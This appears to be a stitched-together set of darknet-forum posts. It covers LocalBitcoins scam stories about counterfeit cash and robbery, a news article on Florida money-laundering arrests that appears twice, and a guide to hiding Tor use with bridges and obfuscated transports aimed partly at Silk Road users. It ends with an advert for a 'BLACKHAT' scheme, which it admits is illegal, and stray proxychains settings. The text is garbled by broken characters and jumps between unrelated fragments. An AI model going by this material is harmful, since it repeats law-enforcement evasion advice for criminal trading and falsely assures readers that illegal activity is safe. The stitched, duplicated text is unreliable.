signature looking nothing like the name. At this point, I was very tempted to call the deal off simply because my gut instinct was really telling me to back out of this but he brought up he had to withdraw another Â£200 from his bank and so I asked him what bank he was with, which was Nationwide, which I am too, so I went with him to the branch with the cash and forms etc in my bag and said I would just sit in the branch since it had air conditioning and was only 5 stores away. In my head at this point, I was trying to get into the branch and see if I could overhear the name he was withdrawing from and also to see if he actually owned the card he had in his hand so I could match the details up with what was on the form.     Upon arrival at the branch, he handed his card over and the bank teller gave everything a quick glance and asked him for further ID and a security check so whilst he done that, I thought I would ask the teller next to him who was free if they could put it on their cash counting machine and showed all the relevant documentation. The cash went behind the counter when she agreed and put it straight on the machine without even looking at the documents surprisingly. Immediately as this happened, the male buying the bitcoins said to me âWhat are you doing?â looking terrified and visibly sweating and shaking and I was absolutely certain something was very wrong at this point and before I could turn to the cashier and ask her to keep hold of the documents & cash and call security and the police for me (I was planning to write it on the piece of paper in my hand to be subtle), I heard a loud beeping sound from behind the desk which was the cash machine, rejecting every note in the pile because they were counterfeit notes, Â£15,000 worth of them. As you can imagine, we had 3 security guards onto us in seconds and police arrived only 2 minutes later and as myself and the other male sat there in handcuffs, the police began to ask questions to me and the other male was taken into another room inside the branch.     Fortunately this day I had my CSV dumps of recent transactions, a letter from my HMRC communications recently as per my other post and also a bank statement to verify the recent transactions, plus copies of the emails I had exchanged with the male concerned as I bring them to every meeting in my bag for reference purposes if anything arises. Soon enough, having went back to the original place we met and reviewing CCTV footage of the whole thing, I was released but they kept everything in my bag, all the money of course and frozen my accounts whilst they investigate which I complied with voluntarily. The male who passed the counterfeit notes has been taken to the police station and will be in court tomorrow and I was advised by the Inspector he will probably be referred to the crown court on the matter and is being held in custody until his trial.     The bank and police were both present for this and the bank strongly recommended I be careful in future and transactions that large can be run through the bank if need be and they can be the third party to sign it and check everything out for Â£35, which will completely cover me for the AMLâs over Â£10,000 and the buyer doesnât need to go on the bank records but the bank will verify the ID is real for me in some branches too. Whilst I was there I also was given a 10 pack of pens to check notes with for future deals and police have asked me to cease trading until this case is resolved and be prepared to be asked to come to court to present testimony if required.     Again I canât name and shame the individual due to a police request, but for what it is worth, that is the story and lesson I have learned from today and despite the many big deals I have done in the past and the many shady characters, this one has really rattled me up.     https://localbitcoins.com/forums/#!/regional/uk#a-dangerous-new-scamming-tr So, another recommendation if you are dealing with cash often is to get yourself some currency detection pens and a black light to check the bills for hidden logos. A quick search online will give you an idea of what to look for in the currency your country uses. Here is one more story about counterfeit money.Quote     I occasionally trade bitcoins via localbitcoins.com, to ensure that I have a good feel for the liquidity of the market and the ability to exit at will. Iâve never had any problems before.     Last week, I responded to a request to buy $500 worth of bitcoin, via a local buyer here in San Francisco.     Nothing unusual about the meet, or the buyer, other than the fact that he wanted to find a contact for regular and higher amount buys. I think he was trying to get me to increase the amount.     Anyhow, I had funded $500 in bitcoins, in escrow with localbitcoins.com and we sat down to do the trade. He gave me 25 x $20 bills, which I counted. The bills felt a bit stiff, like brand new bills from an ATM. I looked at them carefully (or so I thought) and they seemed real. I pocketed the money and moved on.     Fast forward three days later, I go out with a friend. Just before leaving the house, I grab a few $20s and put them in my wallet. At the first bar I paid for a drink, the bartender cam running out 5 min later into the bar area to find me. He showed me the bill I had given him, said âthis is fake, it fell apart when it got wetâ. True enough, the bill had not held up to water like a normal bill. I showed him the other money I had on me and he confirmed it was all fake, except for one $20 I had from before. So I paid for my drink with the real money and left.     For those wondering, the bills are indistinguishable from real $20s unless you know exactly what to look for. The smell and texture are slightly off. The most important clue is that the iridescent â20? on the side that changes from red-green to black-green depending on the angle you look at it. On the fake bills it does not change color.     For my next bitcoin sale, I will be carrying a UV light and pen and will be more careful in scrutiny of the bills. As always, I will only meet in public and I am never unarmed, but now I also have counterfeit detection gear.     Seller Beware â Counterfeit money being passed to bitcoin sellers in San Francisco     Edit: I will be writing an article about this for letstalkbitcoin.com and will provide links to detection tips and products to help with detection. Will also provide a more detailed story and pictures of the notes. Standby a few days for thatâ¦     Edit 2: I will be reviewing the following products against these counterfeit notes, in an upcoming article for letstalkbitcoin.com:     Dri-mark and sharpie brand pens    UV light + magnifying combos    Magnetic testers     http://www.reddit.com/r/Bitcoin/comments/1nj88k/i_was_given_counterfeit_20_bills_in_exchange_for/ If this is not enough to make you feel a bit uncomfortable, then you need to read them again. But what you can do is simply learn how to inspect bills for authenticity. Again, get yourself a handheld black light, a currency marker and anything else that applies to your countryâs currency and you can likely protect yourself against this. If the person buying the Bitcoins off of you seems nervous, or like they are in a hurry to get away, then take greater caution with this buyer. Always try to find buyers with good feedback (although this is not perfect), possibly ask for ID if you would feel more comfortable, and bring a friend with you, but do not make it obvious that you brought a friend with you. Getting scammed, robbed or ripped off sucks, and you need to do whatever you can to avoid it happening to you. LOCALBITCOINS PART 3 â MORE SCAM STORIESThis post is more stories about people being scammed or robbed on LocalBitcoins.Quote     AmbysWorld:     just got robbed in Oklahoma City â Edmond, a kid about 20 years old, brownish-blonde hair, 6 ft tall, 150-160lbs     $950.00 -     be careful doing bitcoin trades.  I know itâs tough to get trust, so my advice is start small and after you have gained trust, make sure the money is in your pocket before you release the coins!!     I guess it is just the price to pay to learn a lesson.     realestone:    can you give more details what happened exactly?     AmbysWorld:     We met, inside a coffee shop, introduced myself, asked him if he had done trades before.  He said he had done several.  I wanted to make sure he was familiar with how the site worked and then to see if he had any questions about bitcoins in general.  I released the coins, and we started to shake hands as he was handing me the envelope.  He jerked the envelope out of my hand and took off running.     Every person I have met has been awesome and excited about bitcoins.  So I let my guard down.  Showed up wearing flip flops.  I started to pursue after he had already taken 3 steps, but then realized I would not be able to run in flippers for very long and stopped after about 100 yards.     The worst part is that I had my 14 year old daughter with me.  There is a special place in hell for people like this!     https://bitcointalk.org/index.php?topic=288053.0 Here is a story from a group of people trying to test out LocalBitcoins for the first time and ended up losing their Bitcoins due to their own ignorance. But the buyer could have done the right thing, and did not.Quote     Bitcoin in hand, we decided to take a look at Localbitcoin and see how easy the system is for someone who does not know the lingo and does not have much experience with computers to see, what the difficulties could be.     So we found a buyer and proceeded to do an exchange of a small amount of Bitcoins. Everything looked great at first as we signed up, got verified and then proceeded to transact with the trader. We sent our Bitcoins and where confronted with some windows which began to confuse our tester, who mistakenly confirmed the transaction, minutes after sending the Bitcoins. Our tester was not sure if they needed to click the confirmation to advise the trader that the coins where sent, so spent some time in the FAQ to find out what to do next. No information was found by our tester, who then guessed that since there was no mention of it, then it must be a trivial issue and confirmed the transaction anyway. What happened next worried out tester as the transaction was marked as closed and they had sent the Bitcoins to the trader without knowing if the fiat money would be deposited into the bank account. We waited 24 hours to confirm a cash transaction into a designated account and lo and behold, its not there.     Next we proceeded to contact the trader and as of writing, we have not heard from them. We contacted Localbitcoin support and began a ticket. Shortly afterwards, we received an email from Localbitcoin support staff and explained the situation and where told that the confirmation did need to be done AFTER we confirmed the funds had been placed into our designated account by the trader.     After a few emails to the support staff, we did explain that we where testing the system useability for the everyday mom and pop situation, because if Bitcoin is to be used properly, it needs to have an easy (dumbed down) system so the inexperienced user can make a trade without making mistakes like our tester did.     http://mentaso.com/bitcoin-news/item/224-localbitcoins-scammed-on-our-first-test-of-the-system.html This next one is an attempt at a phishing scam.

LOCALBITCOINS PART 4 â SELLERS BUSTED FOR MONEY LAUNDERING Here is a simple copy and paste story you should be aware of:Quote     State authorities in Florida on Thursday announced criminal charges targeting three men who allegedly ran illegal businesses moving large amounts of cash in and out of the Bitcoin virtual currency. Experts say this is likely the first case in which Bitcoin vendors have been prosecuted under state anti-money laundering laws, and that prosecutions like these could shut down one of the last remaining avenues for purchasing Bitcoins anonymously.     Working in conjunction with the Miami Beach Police Department and the Miami-Dade State Attorneyâs office, undercover officers and agents from the U.S. Secret Serviceâs Miami Electronic Crimes Task Force contacted several individuals who were facilitating high-dollar transactions via localbitcoins.com, a site that helps match buyers and sellers of the virtual currency so that transactions can be completed face-to-face.     One of those contacted was a localbitcoins.com user nicknamed âMichelhack.â According to this userâs profile, Michelhack has at least 100 confirmed trades in the past six months involving more than 150 Bitcoins (more than $110,000 in todayâs value), and a 99 percent positive âfeedbackâ score on the marketplace. The undercover agent and Michelhack allegedly arranged a face-to-face meeting and exchanged a single Bitcoin for $1,000, a price that investigators say included an almost 17 percent conversion fee.     According to court documents, the agent told Michelhack that he wanted to use the Bitcoins to purchase stolen credit cards online. After that trust-building transaction, Michelhack allegedly agreed to handle a much larger deal: Converting $30,000 in cash into Bitcoins.     Investigators had little trouble tying that Michelhack identity to 30-year-old Michell Abner Espinoza of Miami Beach. Espinoza was arrested yesterday when he met with undercover investigators to finalize the transaction. Espinoza is charged with felony violations of Floridaâs law against unlicensed money transmitters â which prohibits âcurrency or payment instruments exceeding $300 but less than $20,000 in any 12-month periodâ â and Floridaâs anti-money laundering statutes, which prohibit the trade or business in currency of more than $10,000.     Police also conducted a search warrant on his residence with an order to seize computer systems and digital media. Also arrested Thursday and charged with violating both Florida laws is Pascal Reid, 29, a Canadian citizen who was living in Miramar, Fla. Allegedly operating as proy33 on localbitcoins.com, Reid was arrested while meeting with an undercover agent to finalize a deal to sell $30,000 worth of Bitcoins.     Documents obtained from the Florida state court system show that investigators believe Reid had 403 Bitcoins in his on-phone Bitcoin wallet alone â which at the time was the equivalent of approximately USD $316,000. Those same documents show that the undercover agent told Reid he wanted to use the Bitcoins to buy credit cards stolen in the Target breach.     Nicholas Weaver, a researcher at the International Computer Science Institute (ICSI) and at the University of California, Berkeley and keen follower of Bitcoin-related news, said he is unaware of another case in which state law has been used against a Bitcoin vendor. According to Weaver, the Florida case is significant because localbitcoins.com is among the last remaining places that Americans can use to purchase Bitcoins anonymously.     âThe biggest problem that Bitcoin faces is actually self-imposed, because itâs always hard to buy Bitcoins,â Weaver said. âThe reason is that Bitcoin transactions are irreversible, and therefore any purchase of Bitcoins must be made with something irreversible â namely cash. And that means you either have to wait several days for the wire transfer or bank transfer to go through, or if you want to buy them quickly you pay with cash through a site like localbitcoins.com.â     One very popular method of quickly purchasing Bitcoins â BitInstant â was shuttered last year. Last month, BitInstant CEO Charlie Shrem was arrested for money laundering, following allegations that he helped a man in Florida convert more than a million dollars in Bitcoins for use on the online drug bazaar Silk Road.     Itâs still unclear how the defendants Espinoza and Reid were able to obtain so many Bitcoins for sale, although a review of Michelhackâs profile suggests little more than arbitrage â that is, buying Bitcoins for $700 apiece and selling them for a couple hundred dollars more.     There is nothing that links either defendant to the Silk Road trade. But itâs notable that a third individual charged with money laundering as part of this investigation â 28-year-old Canadian citizen Vincente Loyola â is currently serving a 12-month sentence at a U.S. federal detention center for narcotics trafficking.     In any case, Weaver said he anticipates that more states will soon seek to crack down on high-dollar Bitcoin sellers on localbitcoins.com. âIâd expect many more state cases like this one because it will act to strangle the lifeblood of the online dark markets,â such as Silk Road, Weaver said. âIf you want a significant amount of anonymous Bitcoins, right now this community is about the only mechanism still available.â     News of the Florida actions comes on the heels of the arraignment of Ross Ulbricht â the alleged onetime owner of the Silk Road. Ulbricht was scheduled to be arraigned in New York today.     The court documents in this case also offer a great example of the traceability of Bitcoin transactions â a potential danger for both those seeking anonymous payments and for law enforcement officials posing as criminals as part of an undercover investigation. The ICSIâs Weaver noted that, by examining the times and transactions in the criminal complaint, it appears that this is the Bitcoin wallet associated with the undercover officer.     https://krebsonsecurity.com/2014/02/florida-targets-high-dollar-bitcoin-exchangers/ As you can see, the cops are watching LocalBitcoins. Laundering Bitcoins is like laundering real money. You need to have a way to justify where the money came from. Back in the day, the Mafia had small legitimate businesses it would run that it could claim as an income, and they might fix the numbers a bit and say they made more money than they really did. This would provide an income they could use as a reason for having money. If you are somebody who does not work, and only sell drugs on Silk Road, and are trying to cash out your coins, then I hope you have a legitimate reason for holding that many BItcoins, otherwise you could end up like these two guys.

Allegedly operating as proy33 on localbitcoins.com, Reid was arrested while meeting with an undercover agent to finalize a deal to sell $30,000 worth of Bitcoins.     Documents obtained from the Florida state court system show that investigators believe Reid had 403 Bitcoins in his on-phone Bitcoin wallet alone â which at the time was the equivalent of approximately USD $316,000. Those same documents show that the undercover agent told Reid he wanted to use the Bitcoins to buy credit cards stolen in the Target breach.     Nicholas Weaver, a researcher at the International Computer Science Institute (ICSI) and at the University of California, Berkeley and keen follower of Bitcoin-related news, said he is unaware of another case in which state law has been used against a Bitcoin vendor. According to Weaver, the Florida case is significant because localbitcoins.com is among the last remaining places that Americans can use to purchase Bitcoins anonymously.     âThe biggest problem that Bitcoin faces is actually self-imposed, because itâs always hard to buy Bitcoins,â Weaver said. âThe reason is that Bitcoin transactions are irreversible, and therefore any purchase of Bitcoins must be made with something irreversible â namely cash. And that means you either have to wait several days for the wire transfer or bank transfer to go through, or if you want to buy them quickly you pay with cash through a site like localbitcoins.com.â     One very popular method of quickly purchasing Bitcoins â BitInstant â was shuttered last year. Last month, BitInstant CEO Charlie Shrem was arrested for money laundering, following allegations that he helped a man in Florida convert more than a million dollars in Bitcoins for use on the online drug bazaar Silk Road.     Itâs still unclear how the defendants Espinoza and Reid were able to obtain so many Bitcoins for sale, although a review of Michelhackâs profile suggests little more than arbitrage â that is, buying Bitcoins for $700 apiece and selling them for a couple hundred dollars more.     There is nothing that links either defendant to the Silk Road trade. But itâs notable that a third individual charged with money laundering as part of this investigation â 28-year-old Canadian citizen Vincente Loyola â is currently serving a 12-month sentence at a U.S. federal detention center for narcotics trafficking.     In any case, Weaver said he anticipates that more states will soon seek to crack down on high-dollar Bitcoin sellers on localbitcoins.com. âIâd expect many more state cases like this one because it will act to strangle the lifeblood of the online dark markets,â such as Silk Road, Weaver said. âIf you want a significant amount of anonymous Bitcoins, right now this community is about the only mechanism still available.â     News of the Florida actions comes on the heels of the arraignment of Ross Ulbricht â the alleged onetime owner of the Silk Road. Ulbricht was scheduled to be arraigned in New York today.     The court documents in this case also offer a great example of the traceability of Bitcoin transactions â a potential danger for both those seeking anonymous payments and for law enforcement officials posing as criminals as part of an undercover investigation. The ICSIâs Weaver noted that, by examining the times and transactions in the criminal complaint, it appears that this is the Bitcoin wallet associated with the undercover officer.     https://krebsonsecurity.com/2014/02/florida-targets-high-dollar-bitcoin-exchangers/ As you can see, the cops are watching LocalBitcoins. Laundering Bitcoins is like laundering real money. You need to have a way to justify where the money came from. Back in the day, the Mafia had small legitimate businesses it would run that it could claim as an income, and they might fix the numbers a bit and say they made more money than they really did. This would provide an income they could use as a reason for having money. If you are somebody who does not work, and only sell drugs on Silk Road, and are trying to cash out your coins, then I hope you have a legitimate reason for holding that many BItcoins, otherwise you could end up like these two guys. HIDING TOR FROM YOUR ISP â PART 1 â BRIDGES AND PLUGGABLE TRANSPORTSThis post is going to talk about something that has been commonly discussed on the forums recently. How can I hide my tor usage from my ISP ? People are more worried about hiding their tor usage from their ISP, than hiding it from a VPN. There seems to be a back and forth debate about whether using a VPN will or will not protect you. Whether or not the VPN can be convinced to log  your connection, and so forth. A few of my previous posts regarding LulzSec and the YardBird pedophile rings have shown that those who rely on VPNs to protect them are historically known to end up in jail. Even our friend we were recently introduced to, The Grugq says, TOR -> VPN is ok, but VPN -> TOR, go to jail. In my previous posts about VPN -> TOR and TOR -> VPN, I tried to remain neutral in that you should be able to make your own decisions about how you wish to protect yourself. But just remember, at the end of the day, nobody is going to go to jail for you. If you simply want to hide the fact that you are using tor from your ISP, then we have other options than a VPN. We have bridges, and several different pluggable transports. What are these, and how can we use them in Tails?Quote     What bridges are and when to use them     When using Tor with Tails in its default configuration, anyone who can observe the traffic of your Internet connection (for example your Internet Service Provider and perhaps your government and law enforcement agencies) can know that you are using Tor.     This may be an issue if you are in a country where the following applies:     1. Using Tor is blocked by censorship: since all connections to the Internet are forced to go through Tor, this would render Tails useless for everything except for working offline on documents, etc.     2. Using Tor is dangerous or considered suspicious: in this case starting Tails in its default configuration might get you into serious trouble.     Tor bridges, also called Tor bridge relays, are alternative entry points to the Tor network that are not all listed publicly. Using a bridge makes it harder, but not impossible, for your Internet Service Provider to know that you are using Tor.     https://tails.boum.org/doc/first_steps/startup_options/bridge_mode/index.en.html The first thing we are going to do is get some bridges. Let us do this before we configure Tails to use bridges, because once Tails is in bridge mode, we will not be able to connect to tor without working bridges. So the first thing we want to do is visit the following webpage. https://bridges.torproject.org/bridges Enter the impossibly difficult captcha, and click âI am humanâ, and you should get a list of bridges that look like this. These are actual bridges pulled from the tor bridges page.Quote       5.20.130.121:9001 63dd98cd106a95f707efe538e98e7a6f92d28f94    106.186.19.58:443 649027f9ea9a8e115787425430460386e14e0ffa    69.125.172.116:443 43c3a8e5594d8e62799e96dc137d695ae4bd24b2 These bridges are publicly available on the Tor Project website, so they may or not may be the best choice to use, but they are a good start. Another option is to send an email to bridges@bridges.torproject.org with a message in the body saying âget bridgesâ without the quotes. This will only work if sent from a Gmail account or Yahoo, unfortunately. If you want to use this, set up the email account using tor and you will receive a list of around 3 bridges shortly thereafter.  Save them somewhere you can use them the next time you boot up Tails, or write them down. Ok, so now we have our bridges. How do we use bridges in Tails? This is an option we need to activate when we boot up Tails. To activate the bridge mode, we will be adding the bridge boot option to the boot menu. The boot menu is the first screen to appear when Tails starts. It is the black screen that says Boot Tails and gives you two options. 1. Live, 2. Live (Fail Safe). When you are on this screen, press Tab and a list of boot options will appear in the form of text at the bottom of the screen. To add a new boot option, add a Space then type âbridgeâ without the quotes and press enter. You have now activated bridge mode. Once Tails boots up completely, you will get a warning that you have entered bridge mode and not to delete the default IP address in there, which is 127.0.0.1:*. This is advice we will follow, so just click OK and the settings window for tor will pop up. At this point you need to add your bridges. So you are going to take the three bridges you got, and enter the IP address and the port. If we were going to use the example above this is what we would enter.Quote       5.20.130.121:9001    106.186.19.58:443    69.125.172.116:443 For each bridge you add, type it in the available text box where it says âAdd A Bridgeâ and then click the green + button to add that bridge. You will need to add one bridge at a time. Once you are finished adding your bridges, you can click OK. At this point, your yellow tor onion icon in the top right should turn green shortly after and you will be connected to the tor network using a bridge. Again, since these bridges are less likely to be known by your ISP, they are less likely to know that you are using tor when you use bridges. You may wish to look up your bridge before you use it however. Maybe you want to find out where your bridge is located, maybe you want to see who is hosting the bridge, and you can do this by looking for a IP look up service online, by doing a search and typing in the IP address. The three listed above are located in the following locations.Quote     5.20.130.121 â Country:   Lithuania    106.186.19.58:443 â Country: Japan    69.125.172.116:443 â Country: New Jersey, United States And with that, you can decide which bridge would be a better choice for you to use. I suggest however, that you go and get new bridges and do not use the ones I listed above for obvious reasons that they are now linked to Silk Road users by me posting them on this forum. I should note that the way bridges hide the fact that you are using tor from your ISP, is that you are connected to an IP address that is likely not known to your ISP to be affiliated with tor entry nodes. While bridges are a good idea, unfortunately they may not be enough. According to Jacob Applebaum, (a tor developer) bridge traffic is still vulnerable to something called DPI (deep packet inspection) to identify internet traffic flows by protocol, in other words they can tell you are using tor by analyzing the traffic. While tor uses bridge relays to get around a censor that blocks by IP address, the censor can use DPI to recognize and filter tor traffic flows even when they connect to unexpected IP addresses. This is less likely to be done by your ISP, and more likely to be done by the NSA, or other oppresive governments like in China and Iran, so you can choose if this is an issue for you.Quote     Lately, censors have found ways to block Tor even when clients are using bridges. They usually do this by installing boxes in ISPs that peek at network traffic and detect Tor; when Tor is detected they block the traffic flow.     To circumvent such sophisicated censorship Tor introduced obfuscated bridges. These bridges use special plugins called pluggable transports which obfuscate the traffic flow of Tor, making its detection harder.     https://www.torproject.org/docs/bridges#PluggableTransports Pluggable transports are a more new, but less talked about technology being implemented by tor to disguise the fact that you are using tor to your ISP and other censors. As mentioned above, it attempts to transform your tor traffic into innocent looking traffic that would hopefully be indistinguishable from normal web browsing traffic. Currently the most popular pluggable transports are obfuscated bridges. Obfuscation by definition, is the hiding of the intended meaning in communication, making communication confusing, wilfully ambiguous, and harder to interpret. Obfuscated bridges actually transform the traffic to look like random packets of data. Obfuscated bridges currently have 2 protocols. 1. obfs22. obfs3 Obfs2 (The Twobfuscator) is talked about at length at the following official page. https://gitweb.torproject.org/pluggable-transports/obfsproxy.git/blob/HEAD:/doc/obfs2/obfs2-protocol-spec.txt But for the laymans out there, basically obfs2 uses a protocol that disguises your traffic to look like random data, whereas tor has a more distinct structure to it. However, it should be noted in the case of obfs2, that if an attacker sniffs the initial handshake between your computer and the obfuscated bridge, they could get the encryption key used to disguise your traffic and use it to decrypt the disguised traffic which would reveal it as tor traffic. They would not be able to decrypt your tor traffic, but they would be able to see you are using tor. This is not likely something your ISP would do, but it may be something law enforcement or the NSA would do. So if you are only worried about your ISP, then obfs2 would likely suffice. Obfs3 (The Threebfuscator) is talked about at length at the following official page. https://gitweb.torproject.org/pluggable-transports/obfsproxy.git/blob/HEAD:/doc/obfs3/obfs3-protocol-spec.txt Obfs3 uses a very similar protocol to disguise your traffic as obfs2, however it uses a more advanced method of an initial handshake called the Diffie Hellman key exchange. They however found some vulnerabilities in the protocol and had to go a step further and customize the Diffie Hellman key exchange to make it an even more robust method of establishing that initial handshake. Using obfs3 would be a better bet to disguise your traffic if your adversary is the NSA or other law enforcement. So how do you get these obfuscated bridges? They are not as easy to get, but they can be obtained from tor through email. However, you need to request those bridges specifically to get them. You need to use a Gmail or Yahoo account and send an email to bridges@bridges.torproject.org and enter in the body of the email âtransport obfs2? without the quotes, and for obfs3, simply enter âtransport obfs3?. Please note that you can only send one request to tor per email, every 3 hours. Which one you should use, is entirely your choice, I am just giving you the information necessary to make an informed choice. Enter them in this format so that Tails knows which protocol to use. obfs3 83.212.101.2:42782obfs2 70.182.182.109:54542 tor also provides a few obfuscated bridges on their home page which you can use as well, and I will list them below. If you send a request to tor and get a response containing bridges without obfs2 or obsf3 at the beginning of the lines, then these are normal bridges, not obfuscated, and they are likely to be out of obfuscated bridges at the moment. You will have to try again another day. So if you get a response with bridges that are without obfs2 or 3 at the beginning of each line, please again, be aware these are normal bridges, unlike the ones below. obfs3 83.212.101.2:42782obfs3 83.212.101.2:443obfs3 169.229.59.74:31493obfs3 169.229.59.75:46328obfs3 209.141.36.236:45496obfs3 208.79.90.242:35658obfs3 109.105.109.163:38980obfs3 109.105.109.163:47779obfs2 83.212.100.216:47870obfs2 83.212.96.182:46602obfs2 70.182.182.109:54542obfs2 128.31.0.34:1051obfs2 83.212.101.2:45235 I have a feeling that some of you reading this will be inclined to go out and get yourself some obfs3 bridges right away, because you think they are the best choice out there for staying anonymous. And right now they have the potential of being what you hope for in that regard, except for one huge flaw. The number of obfs3 bridges is small. Last report I read put it at around 40 bridges running obfs3, and obfs2 was around 200. So while obfs3 is the most secure option out there, its limited number of available bridges would pool you into a smaller group of people making connections to the 40 available bridges and may not provide any more anonymity for you. tor is in depserate need of more obfs2 and obfs3 bridges at this time and these factors should be taken into account when using obfuscated bridges. One of the solutions to this shortage problem, is to run your own obfuscated bridge. I am not going to go into it, but if you are interested in doing this, you should visit the following page to set up an obfuscated proxy, or better yet, purchase a few VPS and set them up as obfs2 or obfs3 proxies. One of the best things about doing it this way, is that you can configure it (with the instructions provided) to be a private obfuscated bridge, and therefore tor will not give it out to the public. You can then connect to your own private obfs3 bridge. You can also use a friendâs computer, or use a server that you know is secure. But again, make sure that you trust the computer you are using, otherwise it is no more secure than a VPN. Another possible solution to the lack of obfuscated bridges may be another pluggable transport option, something called a flash proxy. This is brand new and not perfectly implemented yet, and please be aware that this is basically still in beta. When thinking about a flash proxy, think about the characteristics of a flash, quick and short lived. This protocol was developed by a tor developer who attended Stanford University, and the idea is that the IP addresses used are changed faster than a censoring agency can detect, track, and block them. This method is similar to using normal bridges, in that, it hides the fact you are connecting to IP addresses known to be related to tor, including when the bridgeâs IP addresses listed by tor are discovered by your ISP or law enforcement. This does not however, hide the fact you are using tor if somebody is analyzing your traffic using DPI (deep packet inspection). The main benefit to this option is that the proxies are run by many people all over the world. They are run when random internet users visit a webpage with a specific plugin that turns their browser into a proxy as long as they are on that page. You are basically using somebody elseâs connection through their browser to connect to a tor relay. You are only using 1 active connection at any time, but you have around 5 established connections to different proxies in case your active connection drops off, then you can start using another proxy in its place. Below is another explanation of how this process works.Quote     In addition to the Tor client and relay, we provide three new pieces. The Tor client contacts the facilitator to advertise that it needs a connection (proxy). The facilitator is responsible for keeping track of clients and proxies, and assigning one to another. The flash proxy polls the facilitator for client registrations, then begins a connection to the client when it gets one. The transport plugins on the client and relay broker the connection between WebSockets and plain TCP. (Diagram below)     https://crypto.stanford.edu/flashproxy/arch.png     A sample session may go like this:     1. The client starts Tor and the client transport plugin program (flashproxy-client), and sends a registration to the facilitator using a secure rendezvous. The client transport plugin begins listening for a remote connection.    2. A flash proxy comes online and polls the facilitator.    3. The facilitator returns a client registration, informing the flash proxy where to connect.    4. The proxy makes an outgoing connection to the client, which is received by the clientâs transport plugin.    5. The proxy makes an outgoing connection to the transport plugin on the Tor relay. The proxy begins sending and receiving data between the client and relay.     In other words, you end up going from your computer, to the proxy, then the proxy to the tor relay. â JR  The whole reason this is necessary is because the client cannot communicate directly with the relay. (Perhaps the censor has enumerated all the relays and blocked them by IP address.) In the above diagram, there are two arrows that cross the censor boundary; here is why we think they are justified. The initial connection from the client to the facilitator (the client registration) is a very low-bandwidth, write-only communication that ideally may happen only once during a session. A careful, slow, specialized rendezvous protocol can provide this initial communication. The connection from the flash proxy to the client is from an IP address the censor has never seen before. If it is blocked within a few minutes, thatâs fine; it wasnât expected to run forever anyway, and there are other proxies lined up and waiting to provide service. I know this might be a bit complicated, but you really do not need to understand how it works to benefit from it. You also might be asking about somebody just blocking your ability to connect with the facilitator (the supplier of the proxies). But, the way you actually connect to the facilitator is in a very special way that tor has designed, and this is built into the flash proxy pluggable transport. This explanation is just for your comfort, not to help you make it work.Quote     The way the client registers with the facilitator, is a special rendezvous step that does not communicate directly with the facilitator, designed to be covert and very hard to block. The way this works in practice is that the flash proxy client transport plugin makes a TLS (HTTPS) connection to Gmail, and sends an encrypted email from an anonymous address (nobody@localhost) to a special facilitator registration address. The facilitator checks this mailbox periodically, decrypts the messages, and inserts the registrations they contain. The result is that anyone who can send email to a Gmail address can do rendezvous, even if the facilitator is blocked.     https://trac.torproject.org/projects/tor/wiki/FlashProxyFAQ Two questions you should be asking. 1) Can I trust the proxies, and/or facilitator? 2) How do I use this? Well, the facilitator is chosen and currently only run by tor, so you can take that at face value. As far as the proxies go, the proxies themselves may or may not be trustworthy, and this is the risk you run every time you use tor. Your bridges that you use may be compromised, your entry nodes, your exit nodes, every single possible hop along your way to the internet can be compromised at any given time. Luckily, even if the proxy is compromised and logging your traffic, they are only going to be able to see encrypted tor traffic. And as I mentioned above, anybody who visits a webpage with a specific plugin on it, becomes a flash proxy as long as they are on that site. This means, some people will be a flash proxy without their knowledge, and others will be flash proxies because they want to be one. The idea behind this is to have multiple users, tens of thousands, if not hundreds of thousands of flash proxies available at all times to increase the number of possible IP addresses you rotate between to keep your ISP and possibly the NSA guessing. So do you use this? It actually currently is not supported in Tails. But it can be used with Tor Pluggable Transports Tor Browser Bundle outside of Tails. You can get it at the following page and it will run on your normal operating system, whether it is Windows, MAC, or Linux. Get the package at the following page. https://www.torproject.org/docs/pluggable-transports.html.en#download Next follow the following tutorial, which is pretty straight forward and has pictures of exactly what you need to do, and will probably do a better job than I would at explaining how to set it up. https://trac.torproject.org/projects/tor/wiki/FlashProxyHowto Essentially it comes down to, enable port forwarding for port 9000, add âbridge flashproxy 0.0.1.0:1? without the quotes, to your torrc, and leave everything else alone unless you need to use a different port, which is unlikely. You may need to make an exception in your firewall for the flashproxy plugin if it asks you. As long as you are using the Tor Pluggable Transports Tor Browser Bundle, it should be pretty easy to get this feature working. But until Tails adds support for it, this is the only option you have if you want to use flash proxy bridges. Ok, so you have a lot of information right now and maybe are left a bit confused, but read over this one a few times and try to extract as much out of it as possible at once. Try setting up normal bridges, then try doing the obfuscated bridges, and once you get those working, then maybe consider doing the flash proxies if you are okay without using Tails. Tails will likely implement support for this later. Ask yourself some questions, do I just want to hide the fact that I am using tor from my ISP? Or am I hiding from somebody much bigger than that? Consider whether it is plausible for you to run a private obfuscated proxy, or even a private bridge. Hopefully now you have enough information to make an informed decision. Currently there are other pluggable transports currently under developed, but not yet deployed. Here is a list of upcoming projects.Quote     ScrambleSuit is a pluggable transport that protects against follow-up probing attacks and is also capable of changing its network fingerprint (packet length distribution, inter-arrival times, etc.).

More info on the guide: This is a guide is 100% auto pilot. And takes about 20-60minutes to set up. It isn't anything hard and literally anybody could do it.  The guide is in extreme detail, and isn't hard to follow, It also notes all precautions you should take. This method is BLACKHAT so what you will be doing is illegal, but bare in mind if you follow my rules / precautions you will be absolutely fine. An investment is needed, of about $10-20, the higher amount of money you invest the more money you will make.

sudo apt-get install proxychains
Note the uwt and Tor Browser notice in Required Knowledge above first. After you have done so it's quite simple.

Open proxychains configuration file.

kdesudo kwrite /etc/proxychains.conf
Go to the bottom of the settings file. Comment out ""socks4 127.0.0.1 9050"" and add for example ""socks5 192.168.0.10 9152"" (for Tor stream isolation) or ""socks5 ip port"" with an IP and port of your choice to set the proxy settings.

